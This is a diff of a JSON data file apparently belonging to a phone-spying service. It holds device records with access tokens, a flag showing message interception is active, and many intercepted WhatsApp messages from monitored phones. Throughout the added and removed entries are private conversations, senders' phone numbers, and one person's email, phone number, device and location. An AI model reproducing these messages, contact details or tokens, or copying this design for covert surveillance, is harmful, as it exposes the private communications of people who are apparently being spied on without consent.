@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776917505991,
+    "lastSeen": 1776917512826,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917513414
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 878-9820-8741",
+        "content": "Ok kak",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506549
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "sipp",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506476
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 821-4849-9859",
+        "content": "KLO sdh selsai bantu peembersihan kantin ya",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506388
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Khifrandev Solution",
+        "content": "boleh kak di 400rb nanti buat lebih simple dari itu kak",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506352
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Maya",
+        "content": "aku tadi pas dibilang jangan chat ga aku chat",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506319
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 12:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776917506304
+      },
       {
         "appName": "WhatsApp",
         "sender": "Rafly",
@@ -3963,62 +4019,6 @@
         "time": "23/04 09:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776906673649
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "KLO sdh selsai bantu peembersihan kantin ya",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906673452
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Maya",
-        "content": "aku tadi pas dibilang jangan chat ga aku chat",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906673262
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906673133
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 851-1746-5790",
-        "content": "bantuin keluar dulu sayang",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906672874
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "📇monitoring netflix \n\n开. name pembeli : april\n开. nomor whatsapp aktif : 0895338763149\n开. email aktif : ayuapriliakecil@gmail.com\n开. pribadi / ressel : \n开. plan / type : \n开. tanggal order : 23 april 2026\n开. durasi langganan : 30 h\n开. device log : infinix hot 9\n开. lokasi log : tangerang\n\n📝 form wajib di isi untuk menghindari kecurangan netflix. isi dan kasi ke onwer.",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906672698
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "plan type juga apa",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906672394
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "pribadi ressel tuh apa njir",
-        "time": "23/04 09:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776906672187
       }
     ],
     "galleryPhotos": [],
@@ -12426,7 +12426,7 @@
     "deviceName": "HP-AMBONV2-0FAF",
     "ownerUsername": "gehgtg17",
     "token": "7fbcd2650ba9cf5ce36f05d0004ee8a1",
-    "lastSeen": 1776917506052,
+    "lastSeen": 1776917511924,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T23:50:06.977Z",
